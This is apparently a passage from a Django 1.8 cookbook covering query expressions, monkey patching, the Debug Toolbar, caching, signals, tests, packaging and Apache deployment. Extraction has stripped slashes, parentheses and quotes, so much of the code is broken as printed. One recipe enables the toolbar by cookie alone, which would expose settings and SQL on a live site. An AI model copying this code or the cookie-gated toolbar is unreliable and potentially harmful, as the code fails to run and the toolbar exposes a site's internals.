"viral_videos_viralvideo"."mobile_impressions"  >  500 THEN popular WHEN "viral_videos_viralvideo"."created" > 2015- 11-06 00:00:00 THEN new ELSE cool END AS "label" FROM "viral_videos_ viralvideo"  437  Chapter 10   Then, in the browser, you will see a simple page similar to the following image, showing the  title of a video, label of the video, embedded video, and impressions on desktop devices,  mobile devices and in total:  The annotate   method in Django QuerySets allows you to add extra columns to the  SELECT SQL statement as well as on-the-fly created properties for the objects retrieved from  QuerySets. With models.F  , we can reference different field values from the selected  database table. In this example, we will create the total_impressions property, which is  the sum of the impressions on the desktop devices and the impressions on mobile devices.  With models.Case   and models.When  , we can return the values depending on  different conditions. To mark the values, we are using models.Value  . In our example,  we will create the label column for SQL query and the property for the objects returned by  QuerySet. It will be set to popular if it has more than 500 impressions, new if it has been  created today, and cool otherwise.  438  Bells and Whistles   At the end of the view, we have the qs.update   methods called. They increment mobile_ impressions or desktop_impressions of the current video, depending on the device  used by the visitor. The incrementation happens at the SQL level. This solves the so-called  race conditions, when two or more visitors are accessing the view at the same time and try to  increase the impressions count simultaneously.

It is not recommended to use monkey patch often; however, sometimes, it is  the only possible way to fix a bug in third-party modules without creating a separate branch of  the module. Also, monkey patching might be used to prepare functional or unit tests without  using complex database or file manipulations. In this recipe, you will learn how to exchange  the default slugify   function with the one from the third-party awesome-slugify  module, which handles German, Greek, and Russian words smarter and allows to create  customized slugs for other languages. As a quick reminder, we uses the slugify   function  to create a URL-friendly version of the object's title or the uploaded filename; it strips the  leading and trailing whitespace, converts the text to lowercase, removes nonword characters,  and converts spaces to hyphens.  Getting ready To get started, execute the following steps:  1.   Install awesome-slugify in your virtual environment, as follows:  myproject_env $ pip install awesome-slugify  2.  Create a guerrilla_patches app in your project and put it under INSTALLED_  APPS in the settings.  439  Chapter 10   How to do it... In the models.py file of the guerrilla_patches app, add the following content:   guerrilla_patches models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.utils import text from slugify import slugify_de as awesome_slugify awesome_slugify.to_lower = True text.slugify = awesome_slugify  How it works... The default Django slugify   function handles German diacritical symbols incorrectly. To  see this for yourself, run the following code in the Django shell without the monkey patch:   myproject_env $ python manage.py shell  >>> from django.utils.text import slugify  >>> slugify "Heizölrückstoßabdämpfung"   u'heizolruckstoabdampfung'  This is incorrect in German as the letter ß is totally stripped out instead of substituting it with  ss and the letters ä, ö, and ü are changed to a, o, and u; whereas, they should be substituted  with ae, oe, and ue.  The monkey patch that we did loads the django.utils.text module at initialization and  assigns the callable instance of the Slugify class as the slugify   function. Now, if you  run the same code in the Django shell, you will get different but correct results, as follows:   myproject_env $ python manage.py shell  >>> from django.utils.text import slugify  >>> slugify "Heizölrückstoßabdämpfung"   u'heizoelrueckstossabdaempfung'  To read more about how to utilize the awesome-slugify module, refer to the following:  https:  pypi.python.org pypi awesome-slugify.  440  Bells and Whistles   There's more... Before creating any monkey patch, we need to completely understand how the code that  we want to modify works. This can be done by analyzing the existing code and inspecting  the values of different variables. To do this, there is a useful built-in Python debugger pdb  module, which can temporarily be added to the Django code or any third-party module to stop  the execution of a development server at any breakpoint. Use the following code to debug an  unclear part of a Python module:  import pdb pdb.set_trace    This launches the interactive shell, where you can type the variables to see their values. If you  type c or continue, the code execution will continue until the next breakpoint. If you type q  or quit, the management command will be aborted. You can learn more commands of the  Python debugger and how to inspect the traceback of the code at https:  docs.python. org 2 library pdb.html.  Another quick way to see a value of a variable in the development server is to raise a warning  with the variable as a message, as follows:  raise Warning, some_variable  When you are in the DEBUG mode, the Django logger will provide you with the traceback and  other local variables.  Don't forget to remove the debugging functions before  committing the code to a repository.  See also   f The Using the Django shell recipe  441  Chapter 10   Toggling the Debug Toolbar While developing with Django, you will want to inspect request headers and parameters,  check the current template context, or measure the performance of SQL queries. All this  and more is possible with the Django Debug Toolbar. It is a configurable set of panels that  displays various debug information about the current request and response. In this recipe, I  will guide you on how to toggle the visibility of the Debug Toolbar, depending on a cookie, set  by bookmarklet. A bookmarklet is a bookmark of a small piece of JavaScript code that you can  run on any page in a browser.  Getting ready To get started with toggling the visibility of the Debug Toolbar, take a look at the following steps:  1.   Install the Django Debug Toolbar to your virtual environment:  myproject_env $ pip install django-debug-toolbar==1.4  2.  Put debug_toolbar under INSTALLED_APPS in the settings.  How to do it... Follow these steps to set up the Django Debug Toolbar, which can be switched on or off using  bookmarklets in the browser:  1.  Add the following project settings:  MIDDLEWARE_CLASSES =        ...     "debug_toolbar.middleware.DebugToolbarMiddleware",    DEBUG_TOOLBAR_CONFIG = {     "DISABLE_PANELS": [],     "SHOW_TOOLBAR_CALLBACK": \         "utils.misc.custom_show_toolbar",     "SHOW_TEMPLATE_CONTEXT": True, }  DEBUG_TOOLBAR_PANELS = [     "debug_toolbar.panels.versions.VersionsPanel",     "debug_toolbar.panels.timer.TimerPanel",  442  Bells and Whistles       "debug_toolbar.panels.settings.SettingsPanel",     "debug_toolbar.panels.headers.HeadersPanel",     "debug_toolbar.panels.request.RequestPanel",     "debug_toolbar.panels.sql.SQLPanel",     "debug_toolbar.panels.templates.TemplatesPanel",     "debug_toolbar.panels.staticfiles.StaticFilesPanel",     "debug_toolbar.panels.cache.CachePanel",     "debug_toolbar.panels.signals.SignalsPanel",     "debug_toolbar.panels.logging.LoggingPanel",     "debug_toolbar.panels.redirects.RedirectsPanel", ]  2.   In the utils module, create a misc.py file with the custom_show_toolbar    function, as follows:  utils misc.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals  def custom_show_toolbar request :     return "1" == request.COOKIES.get "DebugToolbar", False   3.  Open the Chrome or Firefox browser and go to Bookmark Manager. Then, create two   new JavaScript links. The first link shows the toolbar. It looks similar to the following: Name: Debug Toolbar On URL: javascript: function  {document.cookie="DebugToolbar=1;  path= ";location.reload  ;}   ;  4.  The second JavaScript link hides the toolbar and looks similar to the following:  Name: Debug Toolbar Off URL: javascript: function  {document.cookie="DebugToolbar=0;  path= ";location.reload  ;}   ;  How it works... The DEBUG_TOOLBAR_PANELS setting defines the panels to show in the toolbar. The   DEBUG_TOOLBAR_CONFIG dictionary defines the configuration for the toolbar, including   a path to the function that is used to check whether or not to show the toolbar.  443  Chapter 10   By default, when you browse through your project the Django Debug Toolbar will not be shown.  However, as you click on your bookmarklet, Debug Toolbar On, the DebugToolbar cookie will  be set to 1, the page will be refreshed, and you will see the toolbar with debugging panels. For  example, you will be able to inspect the performance of SQL statements for optimization, as  shown in the following screenshot:  444  Bells and Whistles   You will also be able to check the template context variables for the current view, as shown in  the following screenshot:  See also   f The Getting detailed error reporting via e-mail recipe in Chapter 11,    Testing and Deployment  Using ThreadLocalMiddleware The HttpRequest object contains useful information about the current user, language,  server variables, cookies, session, and so on. As a matter of fact, HttpRequest is provided  in the views and middlewares, and then you can pass it or its attribute values to forms,  model methods, model managers, templates, and so on. To make life easier, you can use the  ThreadLocalMiddleware middleware that stores the current HttpRequest object in the  globally-accessed Python thread. Therefore, you can access it from model methods, forms,  signal handlers, and any other place that didn't have direct access to the HttpRequest  object previously. In this recipe, we will define this middleware.  445  Chapter 10   Getting ready Create the utils app and put it under INSTALLED_APPS in the settings.  How to do it... Execute the following two steps:   utils middleware.py  -*- coding: UTF-8 -*- from threading import local _thread_locals = local    1.  Add a middleware.py file in the utils app with the following content:  def get_current_request  :     """ returns the HttpRequest object for this thread """     return getattr _thread_locals, "request", None   def get_current_user  :     """ returns the current user if it exists         or None otherwise """     request = get_current_request       if request:         return getattr request, "user", None   class ThreadLocalMiddleware object :     """ Middleware that adds the HttpRequest object         to thread local storage """     def process_request self, request :         _thread_locals.request = request  2.  Add this middleware to MIDDLEWARE_CLASSES in the settings:  MIDDLEWARE_CLASSES =        ...     "utils.middleware.ThreadLocalMiddleware",    446  Bells and Whistles   How it works... The ThreadLocalMiddleware processes each request and stores the current  HttpRequest object in the current thread. Each request-response cycle in Django is single  threaded. There are two functions: get_current_request   and get_current_user  .  These functions can be used from anywhere to grab the current HttpRequest object or the  current user.  For example, you can create and use CreatorMixin, which saves the current user as the  creator of a model, as follows:   utils models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _  class CreatorMixin models.Model :     """     Abstract base class with a creator     """     creator = models.ForeignKey          "auth.User",         verbose_name=_ "creator" ,         editable=False,         blank=True,         null=True,            def save self, *args, **kwargs :         from utils.middleware import get_current_user         if not self.creator:             self.creator = get_current_user           super CreatorMixin, self .save *args, **kwargs      save.alters_data = True      class Meta:         abstract = True  447  Chapter 10   See also   f The Creating a model mixin with URL-related methods recipe in Chapter 2,    Database Structure   f The Creating a model mixin to handle creation and modification dates recipe in   Chapter 2, Database Structure   f The Creating a model mixin to take care of meta tags recipe in Chapter 2,     f The Creating a model mixin to handle generic relations recipe in Chapter 2,    Database Structure  Database Structure  Caching the method return value If you call the same model method with heavy calculations or database queries multiple times  in the request-response cycle, the performance of the view might be very slow. In this recipe,  you will learn about a pattern that you can use to cache the return value of a method for later  repetitive use. Note that we are not using the Django cache framework here, we are just using  what Python provides us by default.  Getting ready Choose an app with a model that has a time-consuming method that will be used repetitively  in the same request-response cycle.  How to do it... This is a pattern that you can use to cache a method return value of a model for repetitive use  in views, forms, or templates, as follows:  class SomeModel models.Model :      ...     def some_expensive_function self :         if not hasattr self, "_expensive_value_cached" :              do some heavy calculations...              ... and save the result to result variable             self._expensive_value_cached = result         return self._expensive_value_cached  448  Bells and Whistles   For example, let's create a get_thumbnail_url  method for the ViralVideo model that  we created in the Using database query expressions recipe earlier in this chapter:   viral_videos models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import re  ... other imports ...  @python_2_unicode_compatible class ViralVideo CreationModificationDateMixin, UrlMixin :      ...     def get_thumbnail_url self :         if not hasattr self, "_thumbnail_url_cached" :             url_pattern = re.compile                  r'src="https:  www.youtube.com embed  [^"]+ "'                           match = url_pattern.search self.embed_code              self._thumbnail_url_cached = ""             if match:                 video_id = match.groups  [0]                 self._thumbnail_url_cached = \                     "http:  img.youtube.com vi {} 0.jpg".format                          video_id                               return self._thumbnail_url_cached  How it works... The method checks whether the _expensive_value_cached attribute exists for the  model instance. If it doesn't exist, the time-consuming calculations are done and the result  is assigned to this new attribute. At the end of the method, the cached value is returned. Of  course, if you have several weighty methods, you will need to use different attribute names to  save each calculated value.  You can now use something like {{ object.some_expensive_function }} in the  header and footer of a template, and the time-consuming calculations will be done just once.  449  Chapter 10   In a template, you can use the function in both, the {% if %} condition, and output of the  value, as follows:  {% if object.some_expensive_function %}               {{ object.some_expensive_function }}       {% endif %}  In this example, we are checking the thumbnail of a YouTube video by parsing the URL of  the video's embed code, getting its ID, and then composing the URL of the thumbnail image.  Then, you can use it in a template as follows:  {% if video.get_thumbnail_url %}               <img src="{{ video.get_thumbnail_url }}"             alt="{{ video.title }}"  >          {{ video.title }}        {% endif %}  See also   f Refer to Chapter 4, Templates and JavaScript for more details  Using Memcached to cache Django views Django provides a possibility to speed up the request-response cycle by caching the  most expensive parts such as database queries or template rendering. The fastest and  most reliable caching natively supported by Django is the memory-based cache server,  Memcached. In this recipe, you will learn how to use Memcached to cache a view for our  viral_videos app that we created in the Using database query expressions recipe earlier  in this chapter.  Getting ready There are several things to do in order to prepare caching for your Django project:  1.   Install Memcached server, as follows: $ wget http:  memcached.org files memcached-1.4.23.tar.gz  $ tar -zxvf memcached-1.4.23.tar.gz  $ cd memcached-1.4.23  $ . configure && make && make test && sudo make install  450  Bells and Whistles   2.  Start Memcached server, as shown in the following:  $ memcached -d  3.   Install Memcached Python bindings in your virtual environment, as follows:  myproject_env $ pip install python-memcached  How to do it... To integrate caching for your specific views, perform the following steps:  1.  Set CACHES in the project settings, as follows:  CACHES = {     "default": {         "BACKEND": "django.core.cache.backends."             "memcached.MemcachedCache",         "LOCATION": "127.0.0.1:11211",         "TIMEOUT": 60,   1 minute         "KEY_PREFIX": "myproject_production",     } }  2.  Modify the views of the viral_videos app, as follows:   viral_videos views.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.views.decorators.vary import vary_on_cookie from django.views.decorators.cache import cache_page  @vary_on_cookie @cache_page 60  def viral_video_detail request, id :    ...  How it works... Now, if you access the first viral video at http:  127.0.0.1:8000 en viral- videos 1  and refresh the page a few times, you will see that the number of impressions  changes only once a minute. This is because for every visitor, caching is enabled for   60 seconds. Caching is set for the view using the @cache_page decorator.  Memcached is a key-value store and by default for each cached page, the full URL is used to  generate the key. When two visitors access the same page simultaneously, the first visitor will  get the page generated by the Python code and the second one will get the HTML code from  the Memcached server.  451  Chapter 10   In our example, to ensure that each visitor gets treated separately even if they access the  same URL, we are using the @vary_on_cookie decorator. This decorator checks the  uniqueness of the Cookie header of the HTTP request.

See also   f The Using database query expressions recipe  f The Caching the method return value recipe  Using signals to notify administrators about  new entries Django framework has a concept of signals, which are similar to events in JavaScript. There is  a handful of built-in signals that you can use to trigger actions before and after initialization of  a model, saving or deleting an instance, migrating the database schema, handling a request,  and so on. Moreover, you can create your own signals in your reusable apps and handle them  in other apps. In this recipe, you will learn how to use signals to send emails to administrators  whenever a specific model is saved.  Getting ready Let's start with the viral_videos app that we created in the Using database query  expressions recipe.  How to do it... Follow these steps to create notifications to administrators:  1.  Create the signals.py file with the following content:   viral_videos signals.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db.models.signals import post_save from django.dispatch import receiver from .models import ViralVideo  @receiver post_save, sender=ViralVideo  def inform_administrators sender, **kwargs :  452  Bells and Whistles       from django.core.mail import mail_admins     instance = kwargs["instance"]     created = kwargs["created"]     if created:         context = {             "title": instance.title,             "link": instance.get_url  ,         }         plain_text_message = """ A new viral video called "% title s" has been created. You can preview it at % link s.""" % context         html_message = """  A new viral video called "% title s" has been created.   You can preview it  here . """ %  context          mail_admins              subject="New Viral Video Added at example.com",             message=plain_text_message,             html_message=html_message,             fail_silently=True,            2.  Create the apps.py file with the following content:   viral_videos apps.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.apps import AppConfig from django.utils.translation import ugettext_lazy as _  class ViralVideosAppConfig AppConfig :     name = "viral_videos"     verbose_name = _ "Viral Videos"       def ready self :         from .signals import inform_administrators  3.  Update the __init__.py file with the following content:   viral_videos __init__.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals  default_app_config = \     "viral_videos.apps.ViralVideosAppConfig"  453  Chapter 10   4.  Make sure that you have ADMINS set in the project settings, as follows:  ADMINS =        "Aidas Bendoraitis", "aidas.bendoraitis@example.com" ,    How it works... The ViralVideosAppConfig app configuration class has the ready   method, which  will be called when all the models of the project are loaded in the memory. According to the  Django documentation, signals allow certain senders to notify a set of receivers that some  action has taken place. In the ready   method, we will import, therefore, registering the  inform_administrators   signal receiver for the post_save signal, and limiting it to  handle only signals, where the ViralVideo model is the sender. Therefore, whenever we  save the ViralVideo model, the inform_administrators   function will be called.  The function checks whether a video is newly created. In that case, it sends an e-mail to the  system administrators that are listed in ADMINS in the settings.

See also   f The Using database query expressions recipe  f The Creating app configuration recipe in Chapter 1, Getting Started with Django 1.8  f The Checking for missing settings recipe  Checking for missing settings Since Django 1.7, you can use an extensible System Check Framework, which replaces the  old validate management command. In this recipe, you will learn how to create a check if the  ADMINS setting is set. Similarly, you will be able to check whether different secret keys or  access tokens are set for the APIs that you are using.  Getting ready Let's start with the viral_videos app that we created in the Using database query  expressions recipe and extended in the previous recipe.  454  Bells and Whistles   How to do it... To use System Check Framework, follow these simple steps:  1.  Create the checks.py file with the following content:   viral_videos checks.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.core.checks import Warning, register, Tags  @register Tags.compatibility  def settings_check app_configs, **kwargs :     from django.conf import settings     errors = []     if not settings.ADMINS:         errors.append              Warning                  """The system admins are not set in the project  settings""",                 hint="""In order to receive notifications when new  videos are created, define system admins like ADMINS=  "Admin",  "admin@example.com" ,  in your settings""",                 id="viral_videos.W001",                             return errors  2.   Import the checks in the ready   method of the app configuration, as follows:  viral_videos apps.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.apps import AppConfig from django.utils.translation import ugettext_lazy as _  class ViralVideosAppConfig AppConfig :     name = "viral_videos"     verbose_name = _ "Viral Videos"       def ready self :         from .signals import inform_administrators         from .checks import settings_check  455  Chapter 10   3.  To try the check that you just created, remove or comment out the ADMINS setting   and run the check management command in your virtual environment, as shown in  the following:  myproject_env $ python manage.py check  System check identified some issues:  WARNINGS:  ?:  viral_videos.W001  The system admins are not set in the  project settings    HINT: define system admins like ADMINS=  "Admin", "admin@ example.com" ,  in your settings  System check identified 1 issue  0 silenced .  How it works... The System Check Framework has a bunch of checks in the models, fields, database,  administration, authentication, content types, and security, where it raises errors or warnings  if something in the project is not set correctly. Additionally, you can create your own checks  similar to what we did in this recipe.  We have registered the settings_check   function, which returns a list with a warning if  there is no ADMINS setting defined for the project.  Besides the Warning instances from the django.core.checks module, the returned list  can also contain instances of the Debug, Info, Error, and Critical classes or any other  class inheriting from django.core.checks.CheckMessage. Debugs, infos, and warnings  would fail silently; whereas, errors and criticals would prevent the project from running.  In this example, the check is tagged as a compatibility check. The other options are:  models, signals, admin, and security.

For the concluding steps of development cycle, we will take a  look at how to test your project, distribute reusable apps to others, and publish your website  on a remote server. Stay tuned for the final bits and pieces!  457   Testing pages with Selenium Django provides a possibility to write test suites for your website. Test suites automatically  check your website or its components to see whether everything is working correctly. When  you modify your code, you can run tests to check whether the changes didn't affect the  application's behavior in a wrong way. The world of automated software testing can be divided  into five levels: unit testing, integration testing, component interface testing, system testing,  and operational acceptance testing. Acceptance tests check the business logic to know  whether the project works the way it is supposed to. In this recipe, you will learn how to write  acceptance tests with Selenium, which allows you to simulate activities such as filling in forms  or clicking on specific DOM elements in a browser.  Getting ready Let's start with the locations and likes apps from the Implementing the Like widget  recipe in Chapter 4, Templates and JavaScript.

Tests will be running in the DEBUG = False mode; therefore, you have to ensure  that all the static files are accessible in your development environment. Make sure  that you add the following lines to your project's URL configuration:  myproject urls.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf.urls import patterns, include, url from django.conf import settings from django.conf.urls.static import static from django.contrib.staticfiles.urls import \     staticfiles_urlpatterns  urlpatterns = patterns "",       …    urlpatterns += staticfiles_urlpatterns   urlpatterns += static      settings.STATIC_URL,     document_root=settings.STATIC_ROOT   urlpatterns += static      settings.MEDIA_URL,     document_root=settings.MEDIA_ROOT    3.  Collect static files to make them accessible by the test server, as follows:  myproject_env $ python manage.py collectstatic --noinput  461  Chapter 11   4.  Run the tests for the locations app, as shown in the following:   myproject_env $ python manage.py test locations  Creating test database for alias 'default'...  --------------------------------------------------------  Ran 1 test in 19.158s  .  OK  Destroying test database for alias 'default'...  How it works... When we run these tests, the Firefox browser will open and go to the administration login page  at http:  localhost:8081 admin login ?next= locations hkw .  Then, the username and password fields will get filled in with test-admin and you will get  redirected to the detail page of the Haus der Kulturen der Welt location, as follows:  http:  localhost:8081 locations hkw .  There you will see the Like button clicked twice, causing liking and unliking actions.  Let's see how this works in the test suite. We define a class extending  LiveServerTestCase. This creates a test suite that will run a local server under the 8081  port. The setUpClass  class method will be executed at the beginning of all the tests and  the tearDownClass  class method will be executed after the tests have been run. In the  middle, the testing will execute all the methods of the suite whose names start with test. For  each passed test, you will see a dot  .  in the command-line tool, for each failed test there will  be the letter F, and for each error in the tests you will see the letter E. At the end, you will see  hints about the failed and erroneous tests. As we currently have only one test in the suite for  the locations app, you will only see one dot there.  When we start testing, a new test database is created. In setUpClass  , we create a  browser object, one location, and one super user. Then, the test_login_and_like    method is executed, which opens the administration login page, finds the username field,  types in the administrator's username, finds the password field, types in administrator's  password, finds the submit button, and clicks on it. Then, it waits maximal ten seconds   until a DOM element with the.like-button CSS class can be found on the page.  462  Testing and Deployment   As you might remember from the Implementing the Like widget recipe in Chapter 4, Templates  and JavaScript, our widget consists of two elements: a Like button and a badge showing the  total number of likes. If a button is clicked, either your Like is added or removed from the  database by an Ajax call. Moreover, the badge count is updated to reflect the number of likes  in the database, as shown in the following image:  Further in the test, we check what is the initial state of the button is  whether it has the  .active CSS class or not , check the initial number of likes, and simulate a click on the  button. We wait maximal 10 seconds until the count in the badge changes. Then, we check  whether the count in the badge matches the total likes for the location in the database. We  will also check how the count in the badge has changed  increased or decreased . Lastly, we  will simulate the click on the button again to switch back to the previous state.  The sleep   functions are in the test just for you to be able to see the whole workflow. You  can safely remove them in order to make the tests run faster.  Finally, the tearDownClass   method is called, which closes the browser and removes the  location and the super user from the test database.

Unit tests are those that check  whether the functions or methods return correct results. We again take the likes app and  write tests checking whether posting to the json_set_like   view returns {"success";  false} in the response for unauthenticated users and returns {"action": "added",  "count": 1, "obj": "Haus der Kulturen der Welt", "success": true}  for authenticated users. We will use the Mock objects to simulate the HttpRequest and  AnonymousUser objects.  463  Chapter 11   Getting ready Let's start with the locations and likes apps from the Implementing the Like widget  recipe in Chapter 4, Templates and JavaScript.  Install the mock module in your virtual environment, as follows:   myproject_env $ pip install mock  How to do it... We will test the liking action with mock by performing the following steps:  1.

Run the tests for the likes app, as follows:   myproject_env $ python manage.py test likes  Creating test database for alias 'default'...  --------------------------------------------------------  Ran 2 tests in 0.093s  ..  OK  Destroying test database for alias 'default'...  How it works... Just like in the previous recipe, when you run tests for the likes app, at first, a temporary  test database is created. Then, the setUpClass   method is called. Later, the methods  whose names start with test are executed, and finally the tearDownClass   method   is called. Unit tests inherit from the SimpleTestCase class. In setUpClass  , we create a location  and a super user. Also, we find out the ContentType object for the Location model—we  will need it for the view that sets or removes likes for different objects. As a reminder, the view  looks similar to the following and returns the JSON string as a result:  def json_set_like request, content_type_id, object_id :      ...all the view logic goes here...     return HttpResponse          json_str,         content_type="text javascript; charset=utf-8"        In the test_authenticated_json_set_like   and test_anonymous_json_set_ like   methods, we use the Mock objects. They are objects that have any attributes or  methods. Each undefined attribute or method of a Mock object is another Mock object.  Therefore, in the shell, you can try chaining attributes as follows:  >>> import mock  >>> m = mock.Mock    >>> m.whatever.anything  .whatsoever  466     Testing and Deployment   In our tests, we use the Mock objects to simulate the HttpRequest and AnonymousUser  objects. For the authenticated user, we still need the real User object as the view needs the  user's ID to save in the database for the Like object.  Therefore, we call the json_set_like   function and see if the returned JSON response is  correct: it returns {"success": false} in the response if the visitor is unauthenticated;  and returns something like {"action": "added", "count": 1, "obj": "Haus der  Kulturen der Welt", "success": true} for authenticated users.  In the end, the tearDownClass   class method is called that deletes the location and super  user from the test database.

OK  Destroying test database for alias 'default'...  How it works... REST API test suite extends the APITestCase class. Once again, we have the setUpClass    and tearDownClass   class methods that will be executed before and after the different  tests. Also, the test suite has a client attribute of the APIClient type that can be used  to simulate API calls. It has methods for all standard HTTP calls: get  , post  , put  ,  patch  , delete  , head  , and options  ; whereas, in our tests, we are using the GET,  POST, and DELETE requests. Also, client has methods to authenticate a user by the login  credentials, token, or just the User object. In our tests, we are authenticating by the third way,  just passing a user directly to the force_authenticate   method.  The rest of the code is self-explanatory.   f The Using Django REST framework to create API recipe in Chapter 9, Data Import    See also  and Export   f The Testing pages with Selenium recipe  f The Testing views with mock recipe  Releasing a reusable Django app Django documentation has a tutorial about how to package your reusable apps so that they  can be installed later with pip in any virtual environment:  https:  docs.djangoproject.com en 1.8 intro reusable-apps   473  Chapter 11   However, there is an even better way to package and release a reusable Django app using  the Cookiecutter tool, which creates templates for different coding projects such as new  Django CMS website, Flask website, or jQuery plugin. One of the available project templates is  cookiecutter-djangopackage. In this recipe, you will learn how to use it to distribute the  reusable likes app.  Getting ready Install Cookiecutter in your virtual environment:   myproject_env $ pip install cookiecutter  How to do it... To release your likes app, follow these steps:  1.  Start a new Django app project, as follows:   myapp_env $ cookiecutter \  https:  github.com pydanny cookiecutter-djangopackage.git  2.  Answer the questions to create the app template:  full_name [Your full name here]: Aidas Bendoraitis  email [you@example.com]: aidas@bendoraitis.lt  github_username [yourname]: archatas  project_name [dj-package]: django-likes  repo_name [dj-package]: django-likes  app_name [djpackage]: likes  project_short_description [Your project description goes here]:  Django-likes allows your website users to like any object.  release_date [2015-10-02]:  year [2015]:  version [0.1.0]:  474  Testing and Deployment   3.  This will create a file structure, as shown in the following image:  4.  Copy the files of the likes app from a Django project, where you are using it, to the   django-likes likes directory.  5.  Add the reusable app project to the Git repository under GitHub.  475  Chapter 11   6.  Explore different files and complete the license, README, documentation,   configuration and other files.  7.  Make sure that the app passes the tests:   myapp_env $ pip install -r requirements-test.txt   myapp_env $ python runtests.py  8.   If your package is closed source, create a shareable release as a ZIP archive:  myapp_env $ python setup.py sdist  This will create a django-likes dist django-likes-0.1.0.tar.gz file that  can be installed or uninstalled with pip, as follows:  myproject_env $ pip install django-likes-0.1.0.tar.gz   myproject_env $ pip uninstall django-likes  9.   If your package is open source, register and publish your app on Python Package  Index  PyPI :  myapp_env $ python setup.py register   myapp_env $ python setup.py publish  10.  Also, to spread the word, add your app to Django packages by submitting a form at   https:  www.djangopackages.com packages add .  How it works... Cookiecutter fills in the entered requested data in different parts of the Django app project  template. As a result, you get the setup.py file ready for distribution to Python Package  Index, Sphinx documentation, BSD as the default license, universal text editor configuration  for the project, static files and templates included in your app, and other goodies.

The default Django  configuration seems to be quite complex. In this recipe, you will learn how to tweak it in order  to send error e-mails with complete HTML, similar to what is provided by Django in the DEBUG  mode when an error happens.  Getting ready Locate the Django project in your virtual environment.  How to do it... The following procedure will help you send detailed e-mails about errors:  1.  Open the myproject_env lib python2.7 site-packages django utils   log.py file in a text editor and copy the DEFAULT_LOGGING dictionary to your  project's settings as the LOGGING dictionary.  2.  Add the include_html setting to the mail_admins handler, as follows:   myproject conf base.py or myproject settings.py LOGGING = {     "version": 1,     "disable_existing_loggers": False,     "filters": {         "require_debug_false": {             "  ": "django.utils.log.RequireDebugFalse",         },         "require_debug_true": {             "  ": "django.utils.log.RequireDebugTrue",         },     },     "handlers": {         "console": {             "level": "INFO",             "filters": ["require_debug_true"],             "class": "logging.StreamHandler",         },         "null": {             "class": "django.utils.log.NullHandler",         },         "mail_admins": {  477  Chapter 11               "level": "ERROR",             "filters": ["require_debug_false"],             "class": "django.utils.log.AdminEmailHandler",             "include_html": True,         }     },     "loggers": {         "django": {             "handlers": ["console"],         },         "django.request": {             "handlers": ["mail_admins"],             "level": "ERROR",             "propagate": False,         },         "django.security": {             "handlers": ["mail_admins"],             "level": "ERROR",             "propagate": False,         },         "py.warnings": {             "handlers": ["console"],         },     } }  How it works... Logging configuration consists of four parts: loggers, handlers, filters, and formatters. The  following is how they can be described:   f Loggers are entry points in the logging system. Each logger can have a log level:   DEBUG, INFO, WARNING, ERROR, or CRITICAL. When a message is written to the  logger, the log level of the message is compared with the logger's level. If it meets  or exceeds the log level of the logger, it will be further processed by a handler.  Otherwise, the message will be ignored.   f Handlers are engines that define what happens to each message in the logger. They  can be written to a console, sent by an e-mail to the administrator, saved to a log file,  sent to the Sentry error logging service, and so on. In our case, we set the include_ html parameter for the mail_admins handler as we want the full HTML with  traceback and local variables for the error messages that happen in our Django project.  478  Testing and Deployment    f Filters provide additional control over the messages that are passed from the loggers  to handlers. For example, in our case, the e-mails will be sent only when the DEBUG  mode is set to False.   f Formatters are used to define how to render a log message as a string. They are not  used in this example; however, for more information about logging, you can refer to  the official documentation at https:  docs.djangoproject.com en 1.8  topics logging .  See also   f The Deploying on Apache with mod_wsgi recipe  Deploying on Apache with mod_wsgi There are many options as to how to deploy your Django project. In this recipe, I will guide you  through the deployment of a Django project on a dedicated Linux server with Virtualmin.  A dedicated server is a type of Internet hosting, where you lease the whole server that is not  shared with anyone else. Virtualmin is a web-hosting control panel that allows you to manage  virtual domains, mailboxes, databases, and entire servers without having deep knowledge of  the command-line routines of the server administration.  To run the Django project, we will be using the Apache web server with the mod_wsgi module  and a MySQL database.  Getting ready Make sure that you have Virtualmin installed on your dedicated Linux server. For instructions,  refer to http:  www.virtualmin.com download.html.  479  Chapter 11   How to do it... Follow these steps to deploy a Django project on a Linux server with Virtualmin:  1.  Log in to Virtualmin as the root user and set bash instead of sh as the default   shell for the server's users. This can be done by navigating to Virtualmin  System  Customization  Custom Shells, as shown in the following screenshot:  2.  Create a virtual server for your project by navigating to Virtualmin  Create Virtual   Server. Enable the following features: Setup website for domain? and Create MySQL  database?. The username and password that you set for the domain will also be  used for the SSH connections, FTP, and MySQL database access, as follows:  480  Testing and Deployment   3.  Log in to your domain administration panel and set the A record for your domain to   the IP address of your dedicated server.  4.  Connect to the dedicated server via Secure Shell as the root user and install Python   libraries, pip, virtualenv, MySQLdb, and Pillow system wide.  5.  Ensure that the default MySQL database encoding is UTF-8:  1.  Edit MySQL configuration file on the remote server, for example,    using the nano editor: $ ssh root@myproject.com  root@myproject.com's password:  $ nano  etc mysql my.cnf  Add or edit the following configurations: [client]  default-character-set=utf8  [mysql]  481  Chapter 11   default-character-set=utf8  [mysqld]  collation-server=utf8_unicode_ci  init-connect='SET NAMES utf8'  character-set-server=utf8  2.  Press Ctrl + O to save the changes and Ctrl + X to exit the nano editor. 3.  Then, restart the MySQL server, as follows:  $  etc init.d mysql restart  4.  Press Ctrl + D to exit Secure Shell.  6.  When you create a domain with Virtualmin, the user for that domain is created   automatically. Connect to the dedicated server via Secure Shell as a user of your  Django project and create a virtual environment for your project, as follows: $ ssh myproject@myproject.com  myproject@myproject.com's password:  $ virtualenv . --system-site-packages  $ echo source ~ bin activate >> .bashrc  $ source ~ bin activate   myproject myproject@server$  The .bashrc script will be called each time you connect to  your Django project via Secure Shell as a user related to the  domain. The .bashrc script will automatically activate the  virtual environment for this project.  7.   If you host your project code on Bitbucket, you will need to set up SSH keys in order to  avoid password prompts when pulling from or pushing to the Git repository:  1.  Execute the following commands one by one:   myproject myproject@server$ ssh-keygen   myproject myproject@server$ ssh-agent  bin bash   myproject 